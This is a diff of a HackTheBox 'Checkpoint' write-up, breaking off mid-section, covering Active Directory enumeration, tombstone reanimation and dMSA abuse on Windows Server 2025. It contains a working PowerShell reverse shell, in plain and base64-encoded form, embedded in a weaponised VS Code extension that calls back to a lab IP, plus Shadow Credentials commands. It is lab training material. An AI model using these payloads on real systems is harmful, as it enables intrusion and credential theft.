@@ -7,6 +7,7 @@ season: Season 11
 tags:
   - Active Directory
   - Windows Server 2025
+  - Tombstone Reanimation
   - VS Code Extension
   - VSIX
   - dMSA
@@ -16,34 +17,33 @@ tags:
   - Volatility 3
 date: '2026-06-13'
 pointsAwarded: 30
-machineIP: ''
-summary: 'A state-of-the-art Windows Server 2025 Active Directory machine. Foothold is achieved by weaponizing a malicious VS Code extension (.vsix) deployed to an exposed DevDrop SMB share. Privilege escalation abuses cutting-edge Windows Server 2025 Delegated Managed Service Account (dMSA) mutual link pairing via SharpSuccessor to impersonate svc_deploy, followed by memory forensics on a VM snapshot with Volatility 3 to extract the Domain Administrator hash.'
+machineIP: '10.129.30.207'
+summary: 'A state-of-the-art Windows Server 2025 Active Directory machine showcasing novel Active Directory attack paths. Reconnaissance begins with BloodyAD reanimating a tombstoned user (Mark Davies) to access an internal DevDrop SMB share. Weaponizing a malicious Visual Studio Code extension (.vsix) grants initial access as ryan.brooks. Privilege escalation navigates around unsupported PKINIT to abuse cutting-edge Windows Server 2025 Delegated Managed Service Account (dMSA) mutual pairing via SharpSuccessor, dumping the legacy NTLM hash for svc_deploy. Finally, memory forensics with Volatility 3 on an unprotected VM memory snapshot reveals the Domain Administrator hash.'
 ---
 
 # 🛡️ HTB - Checkpoint (Medium)
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
-  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
+  <img src="https://img.shields.io/badge/OS-Windows%20Server%202025-blue?style=for-the-badge&logo=windows" alt="OS Windows Server 2025" />
   <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
 </p>
 
 ---
 
-### 💻 Target Information
+### Target Information
 - **Machine Name:** Checkpoint
-- **Operating System:** Windows Server 2025 (Build 26100) Active Directory Domain Controller
-- **Difficulty:** Medium
-- **Date of Scan:** 2026-06-13
-- **Vulnerabilities:** Unrestricted VS Code Extension (.vsix) Execution via SMB DevDrop, Windows Server 2025 dMSA Mutual Pairing Abuse (BadSuccessor Weaponization), Unprotected VM Memory Snapshots in SMB Backups (Volatility 3 SAM Hash Extraction)
+- **Operating System:** Windows Server 2025 Build 26100 (Active Directory Domain Controller: `checkpoint.htb`)
+- **Difficulty:** Medium (30 pts)
+- **Primary Attack Vectors:** Active Directory Deleted Objects Reanimation, VSIX Visual Studio Code Extension Execution via DevDrop SMB Share, Windows Server 2025 dMSA Mutual Pairing Weaponization (SharpSuccessor ASN.1 DER Key Extraction), VM Memory Snapshot Analysis with Volatility 3.
 
 ---
 
 ## Step 1 - Reconnaissance
 
-### Active Directory Port Scan & Service Enumeration
+### Initial Nmap Scan
 
-We start our reconnaissance by scanning the target host using Nmap:
+We begin our enumeration with a comprehensive TCP port and service scan against the target:
 
 ```bash
 nmap -A -sS -P -T4 --min-rate 5000 10.129.30.207
@@ -66,209 +66,783 @@ PORT     STATE SERVICE           VERSION
 636/tcp  open  ldapssl?
 3268/tcp open  ldap
 3269/tcp open  globalcatLDAPssl?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022 (85%)
+Aggressive OS guesses: Microsoft Windows Server 2022 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: 6h59m03s
-| smb2-security-mode: 
-|   3:1:1: Message signing enabled and required
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2026-06-18T21:23:42
+|_  start_date: N/A
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   392.21 ms 10.10.14.1
+2   393.16 ms 10.129.30.207
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.66 seconds
 ```
 
-- 🔍 *The host is a Windows Server 2025 Domain Controller (`checkpoint.htb`).*
-- 🔍 *We enumerate available SMB shares using NetExec (nxc):*
+The scan reveals a standard Active Directory Domain Controller topology (DNS, Kerberos, RPC, LDAP/LDAPS, SMB). The box description provided starting credentials for an initial low-privileged domain user:
+
+```text
+alex.turner / Checkpoint2024!
+```
+
+---
+
+### SMB & User Enumeration
+
+Let's validate these credentials against SMB using NetExec (`nxc`):
 
 ```bash
-nxc smb checkpoint.htb -u '' -p '' --shares
+nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!'
 ```
 
 ```text
-SMB  10.129.30.207  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb)
-SMB  10.129.30.207  445  DC01  [+] checkpoint.htb\: 
-SMB  10.129.30.207  445  DC01  [*] Enumerated shares
-SMB  10.129.30.207  445  DC01  Share        Permissions  Remark
-SMB  10.129.30.207  445  DC01  -----        -----------  ------
-SMB  10.129.30.207  445  DC01  ADMIN$                    Remote Admin
-SMB  10.129.30.207  445  DC01  C$                        Default share
-SMB  10.129.30.207  445  DC01  DevDrop      READ,WRITE   VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
-SMB  10.129.30.207  445  DC01  IPC$         READ         Remote IPC
-SMB  10.129.30.207  445  DC01  NETLOGON     READ         Logon server share
-SMB  10.129.30.207  445  DC01  SYSVOL       READ         Logon server share
-SMB  10.129.30.207  445  DC01  VMBackups                 Virtual Machine Backups
+SMB         10.129.30.207   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
+SMB         10.129.30.207   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
 ```
 
-- 🔍 *The **DevDrop** share has public **READ,WRITE** access! The share remark reveals that it processes `.vsix` extension packages compatible with VS Code engine 1.118.0.*
+Authentication succeeds! Notice the operating system build: **Windows Server 2025 Build 26100**. This immediately indicates that newer Active Directory security features and mechanisms might be at play.
+
+Next, let's enumerate domain users:
+
+```bash
+nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --users
+```
+
+```text
+SMB         10.129.30.207   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
+SMB         10.129.30.207   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
+SMB         10.129.30.207   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.129.30.207   445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain
+SMB         10.129.30.207   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         10.129.30.207   445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account
+SMB         10.129.30.207   445    DC01             alex.turner                   2026-05-09 09:00:08 0
+SMB         10.129.30.207   445    DC01             ryan.brooks                   2026-05-10 13:46:18 0
+SMB         10.129.30.207   445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account
+SMB         10.129.30.207   445    DC01             james.harper                  2026-05-09 09:02:53 0
+SMB         10.129.30.207   445    DC01             sarah.mitchell                2026-05-09 09:02:58 0
+SMB         10.129.30.207   445    DC01             emily.carter                  2026-05-09 09:03:05 0
+SMB         10.129.30.207   445    DC01             david.reynolds                2026-05-09 09:03:11 0
+SMB         10.129.30.207   445    DC01             jessica.coleman               2026-05-09 09:03:15 0
+SMB         10.129.30.207   445    DC01             lauren.flores                 2026-05-09 09:03:21 0
+SMB         10.129.30.207   445    DC01             michael.torres                2026-05-09 09:03:28 0
+SMB         10.129.30.207   445    DC01             kevin.patterson               2026-05-09 09:03:33 0
+SMB         10.129.30.207   445    DC01             brian.jenkins                 2026-05-09 09:03:37 0
+SMB         10.129.30.207   445    DC01             megan.perry                   2026-05-09 09:03:42 0
+SMB         10.129.30.207   445    DC01             max.palmer                    2026-05-26 01:25:15 0
+SMB         10.129.30.207   445    DC01             [*] Enumerated 17 local users: CHECKPOINT
+```
+
+We find 17 domain accounts, including notable ones like `svc_deploy`, `ryan.brooks`, and `max.palmer`.
+
+---
+
+### SMB Shares Enumeration
+
+Now let's check accessible SMB shares:
+
+```bash
+smbclient -L //checkpoint.htb -U 'alex.turner%Checkpoint2024!'
+```
+
+```text
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+        VMBackups       Disk
+```
+
+Two custom shares immediately draw our interest:
+1. **`DevDrop`**: Described as *"VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0"*.
+2. **`VMBackups`**: Indicates virtual machine backup storage.
+
+Let's test if `alex.turner` can access `VMBackups`:
+
+```bash
+smbclient //checkpoint.htb/VMBackups -U 'checkpoint.htb\alex.turner%Checkpoint2024!'
+```
+
+```text
+Try "help" to get a list of possible commands.
+smb: \> dir
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> ls
+NT_STATUS_ACCESS_DENIED listing \*
+```
+
+Access is denied to `VMBackups` for user `alex.turner`.
+
+---
+
+### LDAP Group Enumeration
+
+Next, let's enumerate the Domain Groups using LDAP:
+
+```bash
+nxc ldap 10.129.30.207 -u 'alex.turner' -p 'Checkpoint2024!' --groups
+```
+
+```text
+LDAP        10.129.30.207   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
+LDAP        10.129.30.207   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
+LDAP        10.129.30.207   389    DC01             Administrators                           membercount: 3
+LDAP        10.129.30.207   389    DC01             Users                                    membercount: 3
+LDAP        10.129.30.207   389    DC01             IT-Staff                                 membercount: 3
+LDAP        10.129.30.207   389    DC01             Finance-Staff                            membercount: 2
+LDAP        10.129.30.207   389    DC01             HR-Staff                                 membercount: 2
+LDAP        10.129.30.207   389    DC01             Engineering-Staff                        membercount: 4
+LDAP        10.129.30.207   389    DC01             VPN-Users                                membercount: 4
+LDAP        10.129.30.207   389    DC01             DevTeam                                  membercount: 3
+LDAP        10.129.30.207   389    DC01             BackupAccess                             membercount: 1
+```
+
+Notice the custom group **`BackupAccess`** with a member count of `1`. This group likely possesses read rights over `VMBackups`.
+
+---
+
+### BloodHound Data Collection & Writable Object Discovery
+
+When standard BloodHound ingestion tools failed against the DC, we utilized `bloodyAD` to collect domain information:
+
+```bash
+bloodyAD --host 10.129.32.9 -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get bloodhound
+```
+
+```text
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:01,  1.92it/s]
+Generating lookuptable: 106it [00:03, 30.89it/s]
+Dumping SDs: 100%|█| 110/110 [00:29<00:00]
+Dumping domains: 100%|█| 1/1 [00:00<00:00]
+Dumping users: 100%|█| 17/17 [00:00<00:00]
+Dumping computers: 100%|█| 1/1 [00:00<00:00]
+Dumping groups: 100%|█| 58/58 [00:00<00:00]
+Dumping GPOs: 100%|█| 2/2 [00:00<00:00]
+Dumping OUs: 100%|█| 8/8 [00:00<00:00]
+Dumping Containers: 100%|█| 19/19 [00:00<00:00]
+[+] Bloodhound data saved to 20260619T144130_Bloodhound.zip
+[+] Found 0 trusts
+```
+
+Analyzing the BloodHound graph revealed that `alex.turner` is a member of 4 groups, but possesses no outbound administrative controls over other active users.
+
+Instead of outbound group controls, let's query `bloodyAD` for Active Directory objects where `alex.turner` has write permissions:
+
+```bash
+bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get writable
+```
+
+```text
+distinguishedName: OU=Employees,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
+DACL: WRITE
+
+distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+```
+
+> ⚠️ **Technical Detail:**  
+> The enumeration reveals critical access:
+> 1. We have write permissions over `CN=Deleted Objects,DC=checkpoint,DC=htb` (the Active Directory Recycle Bin / Tombstone container).
+> 2. We have `WRITE` permissions over a deleted user account: `CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e`.
+> 3. We have `CREATE_CHILD` on `OU=Employees,DC=checkpoint,DC=htb`.
+
+Because we hold write privileges over the deleted object and `CREATE_CHILD` on `OU=Employees`, we can **reanimate** (restore) Mark Davies!
+
+---
+
+### Tombstone Reanimation: Restoring Mark Davies
+
+Let's execute the tombstone restore command with `bloodyAD`:
+
+```bash
+bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
+```
+
+```text
+[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
+```
+
+Mark Davies is now successfully restored under the active `OU=Employees` container!
+
+Next, we test whether Mark shares the same default password as Alex Turner (`Checkpoint2024!`):
+
+```bash
+nxc smb checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!'
+```
+
+```text
+SMB         10.129.34.54    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
+SMB         10.129.34.54    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
+```
+
+Authentication succeeds! Password reuse validated.
+
+Now, let's list the SMB shares accessible to `mark.davies`:
+
+```bash
+smbclient -L //checkpoint.htb -U 'mark.davies%Checkpoint2024!'
+```
+
+```text
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+        VMBackups       Disk
+```
+
+Let's check our access permissions on `DevDrop`:
+
+```bash
+smbclient //checkpoint.htb/DevDrop -U 'mark.davies%Checkpoint2024!'
+```
+
+```text
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Jun 18 17:15:30 2026
+  ..                                  D        0  Thu Jun 18 17:15:30 2026
+```
+
+Mark Davies has full write access to the **`DevDrop`** share!
 
 ---
 
 ## Step 2 - Initial Foothold
 
-### Weaponizing Malicious VS Code Extension (.vsix) Package
+### Weaponizing a VS Code Extension (.vsix)
 
-> [!TIP]
-> **Initial Foothold Strategy:**
-> - Create a VS Code extension directory with `package.json` and an entrypoint script containing the PowerShell reverse shell.
-> - Package the extension into a `.vsix` archive using `@vscode/vsce`.
-> - Upload the package to the writable `DevDrop` SMB share monitored by the VS Code Server engine.
-> - Catch the incoming reverse shell as `checkpoint\ryan.brooks`.
+The `DevDrop` share serves as a drop directory where an automated backend or developer workstation automatically ingests and installs approved Visual Studio Code extensions (`.vsix` files) compatible with VS Code engine `1.118.0`.
 
-- 🔍 *We create a new directory and build the extension manifest (`package.json`):*
+A `.vsix` file is essentially a ZIP archive containing the extension manifest and JavaScript entry point. If we craft an extension with an activation event of `*` (which fires immediately upon launch) containing a reverse shell, we can trigger remote code execution.
+
+#### 1. Setup Reverse Shell Variables & Encoding
+
+```bash
+LHOST="10.10.14.70" # Replace with your tun0 IP
+LPORT="4444"
+
+# PowerShell TCP reverse shell one-liner:
+PAYLOAD="\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + ' > ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+
+ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)
+```
+
+#### 2. Create the Extension Manifest (`package.json`)
 
 ```json
 {
-  "name": "theme-plugin",
-  "displayName": "Theme Plugin",
+  "name": "devtools-helper",
+  "displayName": "DevTools Helper",
   "version": "1.0.0",
-  "publisher": "Checkpoint",
-  "engines": {
-    "vscode": "^1.80.0"
-  },
+  "engines": {"vscode": "^1.118.0"},
+  "activationEvents": ["*"],
   "main": "./extension.js",
-  "activationEvents": [
-    "onStartupFinished"
-  ]
+  "contributes": {}
 }
 ```
 
-- 🔍 *In `extension.js`, we embed a PowerShell reverse shell that executes automatically upon extension activation:*
+#### 3. Create the Entry Point Script (`extension.js`)
 
 ```javascript
-const { exec } = require('child_process');
+const cp = require('child_process');
 
-function activate(context) {
-    const payload = "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.54',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' > ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
-    const b64 = Buffer.from(payload, 'utf16le').toString('base64');
-    exec(`powershell.exe -NoP -NonI -W Hidden -Enc ${b64}`);
-}
+exports.activate = function() {
+    cp.exec('powershell -e ' + 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANwAwACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAIAA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');
+};
 
-module.exports = { activate };
+exports.deactivate = function() {};
 ```
 
-- 🔍 *We package the extension with `vsce` and copy it to the `DevDrop` share:*
+#### 4. Package into VSIX Archive
+
+We use the official VS Code extension packager (`vsce`):
 
 ```bash
-npx @vscode/vsce package --no-git-tag-version
-smbclient //checkpoint.htb/DevDrop -N -c "put theme-plugin-1.0.0.vsix"
+vsce package
 ```
 
-- 🔍 *We set up our Netcat listener and wait for the VS Code backend to install the extension:*
+```text
+ WARNING  A 'repository' field is missing from the 'package.json' manifest file.
+Use --allow-missing-repository to bypass.
+Do you want to continue? [y/N] y
+ WARNING  Using '*' activation is usually a bad idea as it impacts performance.
+Do you want to continue? [y/N] y
+ WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found
+Do you want to continue? [y/N] y
+ INFO  Files included in the VSIX:
+devtools-helper-1.0.0.vsix
+├─ [Content_Types].xml
+├─ extension.vsixmanifest
+└─ extension/
+   ├─ extension.js [1.44 KB]
+   └─ package.json [0.2 KB]
+
+ DONE  Packaged: /root/evil-ext/extension/devtools-helper-1.0.0.vsix (4 files, 2.06 KB)
+```
+
+#### 5. Uploading and Catching the Shell
+
+First, start a netcat listener on port 4444:
 
 ```bash
 nc -lvnp 4444
 ```
 
-```text
-listening on [any] 4444 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.30.207] 51928
-PS C:\Program Files\Microsoft VS Code > whoami
-checkpoint\ryan.brooks
+Then upload the package to the `DevDrop` share:
+
+```bash
+smbclient //checkpoint.htb/DevDrop -U 'mark.davies%Checkpoint2024!'
 ```
 
-- 🔍 *We have obtained our initial shell as `checkpoint\ryan.brooks`! We capture `user.txt` on Ryan's desktop.*
+```text
+smb: \> del *
+smb: \> put devtools-helper-1.0.0.vsix
+putting file devtools-helper-1.0.0.vsix as \devtools-helper-1.0.0.vsix (1.8 kB/s) (average 1.8 kB/s)
+```
+
+Within a minute, the automated VS Code client ingests the extension, executes our payload, and connects back:
+
+```text
+listening on [any] 4444 ...
+connect to [10.10.14.70] from (UNKNOWN) [10.129.34.54] 60072
+whoami
+checkpoint\ryan.brooks
+PS C:\Program Files\Microsoft VS Code >
+```
+
+Foothold established as **`checkpoint\ryan.brooks`**! We can navigate to `C:\Users\ryan.brooks\Desktop` and retrieve `user.txt`.
 
 ---
 
-## Step 3 - Privilege Escalation & Domain Takeover
+## Step 3 - Privilege Escalation
 
-### BloodHound DACL Analysis & Shadow Credentials Failure
+### Analyzing Privileges & BloodHound Graph
 
-- 🔍 *We run BloodHound to analyze permissions granted to `ryan.brooks`.*
-- 🔍 *Ryan possesses `GenericWrite` over `svc_deploy` and `CreateChild` over `OU=DMSAHolder,DC=checkpoint,DC=htb`.*
-- 🔍 *We first test Shadow Credentials against `svc_deploy` via Whisker and Rubeus:*
+Let's review the privilege path originating from `ryan.brooks`:
+
+```text
+ryan.brooks
+    │
+    │ (has GenericWrite)
+    ▼
+svc_deploy
+    │
+    │ (memberOf)
+    ▼
+BackupAccess, Remote Management Users, Domain Users
+```
+
+`ryan.brooks` has `GenericWrite` permissions over the service account **`svc_deploy`**.
+
+---
+
+### Attempt 1: Shadow Credentials via Whisker & PKINIT Failure
+
+With `GenericWrite` over `svc_deploy`, the typical approach is the Shadow Credentials attack (modifying the `msDS-KeyCredentialLink` attribute):
 
 ```powershell
-.\Whisker.exe add /target:svc_deploy /path:C:\Temp\svc_deploy.pfx /password:'P@ssw0rd'
-.\Rubeus.exe asktgt /user:svc_deploy /certificate:C:\Temp\svc_deploy.pfx /password:"P@ssw0rd" /domain:checkpoint.htb /dc:DC01.checkpoint.htb
+PS C:\temp > .\Whisker.exe add /target:svc_deploy /path:C:\Temp\svc_deploy.pfx /password:'P@ssw0rd'
 ```
 
 ```text
+[*] Searching for the target account
+[*] Target user found: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID f9656a34-f624-4630-8d1a-81f7f0ca9113
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Saving the associated certificate to file...
+[*] The associated certificate was saved to C:\Temp\svc_deploy.pfx
+```
+
+Now we attempt to request a TGT using Rubeus with PKINIT pre-authentication:
+
+```powershell
+PS C:\temp > .\Rubeus.exe asktgt /user:svc_deploy /certificate:C:\Temp\svc_deploy.pfx /password:"P@ssw0rd" /domain:checkpoint.htb /dc:DC01.checkpoint.htb /getcredentials /show
+```
+
+```text
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|\____/|____/|_____)\____/(___/
+
+  v2.1.2
+
 [*] Action: Ask TGT
 [*] Using PKINIT with etype rc4_hmac and subject: CN=svc_deploy
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'checkpoint.htb\svc_deploy'
+[*] Using domain controller: fe80::1769:18da:e00a:d68a%5:88
+
 [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
 ```
 
-- 🔍 *The Domain Controller does not support PKINIT (`KDC_ERR_PADATA_TYPE_NOSUPP`), preventing standard Shadow Credentials authentication.*
+> ⚠️ **Technical Detail:**  
+> The KDC returns `KDC_ERR_PADATA_TYPE_NOSUPP` (Pre-Authentication Data Type Not Supported). The Domain Controller does not have an Enterprise Certificate Authority (AD CS) or Kerberos certificate installed to support PKINIT pre-authentication. Shadow Credentials cannot be directly converted into a TGT!
 
-### Windows Server 2025 Delegated Managed Service Account (dMSA) Mechanics
+---
 
-- 🔍 *Windows Server 2025 introduces **Delegated Managed Service Accounts (dMSA)** to replace legacy service accounts.*
-- 🔍 *In Windows Server 2025, migration from a legacy service account to a dMSA requires a bidirectional link:*
-  - **msDS-ManagedAccountPrecededByLink** on the dMSA points to the predecessor account (`svc_deploy`).
-  - **msDS-SupersededManagedAccountLink** on the predecessor account points back to the dMSA.
-- 🔍 *Because `ryan.brooks` has `CreateChild` permissions on `OU=DMSAHolder` and `GenericWrite` on `svc_deploy`, we can create our own rogue dMSA and establish mutual link pairing!*
+### Attempt 2: Delegated Managed Service Accounts (dMSA) & BadSuccessor
 
-> [!IMPORTANT]
-> **dMSA Takeover Execution Workflow:**
-> 1. `ryan.brooks` verifies `CreateChild` rights on `OU=DMSAHolder,DC=checkpoint,DC=htb`.
-> 2. Create attacker-controlled dMSA object (`attacker_dmsa$`).
-> 3. Abuse `GenericWrite` on target `svc_deploy` to establish mutual pairing (`msDS-ManagedAccountPrecededByLink` and `msDS-SupersededManagedAccountLink`).
-> 4. Domain Controller validates mutual pairing.
-> 5. Request dMSA-backed TGS via Rubeus to impersonate `svc_deploy`.
+Since `ryan.brooks` has `GenericWrite` over `svc_deploy`, we must explore new Windows Server 2025 features: **Delegated Managed Service Accounts (dMSA)**.
 
-### SharpSuccessor Mutual Pairing Link Weaponization
+#### What is dMSA?
+dMSA is an Active Directory feature introduced in Windows Server 2025 designed to replace legacy service accounts with automatically managed, rotation-backed identities.
+The transition relies on linking accounts as a **predecessor** and **successor**:
+- `msDS-ManagedAccountPrecededByLink`: Written on the dMSA object, pointing to the original legacy user (predecessor).
+- `msDS-DelegatedMSAState`: State of migration (ready, completed, etc.).
 
-- 🔍 *We execute `SharpSuccessor.exe` to automate the dMSA creation and attribute pairing:*
+#### The BadSuccessor Vulnerability & The Windows Server 2025 Patch
+In the original pre-release implementation of dMSA ("BadSuccessor"), the Domain Controller accepted a one-way pointer: if an attacker created a dMSA and set `msDS-ManagedAccountPrecededByLink` pointing to a privileged target, the KDC immediately minted tickets with the target's identity without verification.
+
+Microsoft patched this design flaw by enforcing **mutual two-way linking**:
+1. The dMSA object must point to the legacy account via `msDS-ManagedAccountPrecededByLink`.
+2. The legacy target account must point back to the dMSA object via `msDS-SupersededManagedAccountLink`.
+3. The legacy target's attribute `msDS-SupersededServiceAccountState` must be set to `2`.
+
+Because `ryan.brooks` holds `GenericWrite` over `svc_deploy`, we can write the return link on `svc_deploy`!
+
+---
+
+### Checking CreateChild Rights on `OU=DMSAHolder`
+
+To create the dMSA successor object, we need `CreateChild` rights on the dMSA container. In this domain, that container is `OU=DMSAHolder,DC=checkpoint,DC=htb`.
+
+Let's check our rights using `PowerView.ps1`:
 
 ```powershell
